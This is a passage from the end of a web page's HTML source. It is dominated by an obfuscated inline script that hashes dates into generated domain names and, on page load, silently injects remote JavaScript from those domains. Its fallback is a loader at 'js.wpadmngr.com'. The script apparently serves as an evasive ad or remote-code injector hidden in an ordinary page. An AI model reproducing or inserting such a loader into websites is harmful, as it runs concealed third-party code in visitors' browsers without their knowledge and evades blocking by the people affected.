Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>